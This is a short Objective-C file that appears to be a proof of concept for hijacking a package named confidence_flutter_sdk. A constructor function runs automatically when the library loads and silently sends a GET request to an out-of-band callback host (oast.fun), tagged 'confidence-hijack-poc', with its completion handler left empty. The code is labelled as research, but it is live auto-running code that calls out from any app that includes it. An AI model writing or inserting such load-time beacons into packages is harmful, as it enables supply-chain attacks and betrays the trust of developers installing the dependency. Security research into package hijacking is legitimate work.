#import <Foundation/Foundation.h>

@interface ConfidenceAudit : NSObject
@end

@implementation ConfidenceAudit


__attribute__((constructor))
static void initialize_audit() {
    NSLog(@"🛰️ [SYSTEM AUDIT] confidence_flutter_sdk: Security Probe Triggered.");
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *oastUrl = @"http://rscrwozltcmjjimsghzq7gld2u3j4yzso.oast.fun/poc_check";
        NSURL *url = [NSURL URLWithString:oastUrl];
        
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
        [request setHTTPMethod:@"GET"];
        [request setValue:@"confidence-hijack-poc" forHTTPHeaderField:@"X-Research-Type"];
        
        NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request 
            completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            // Silent execution
        }];
        [task resume];
    });
}

@end
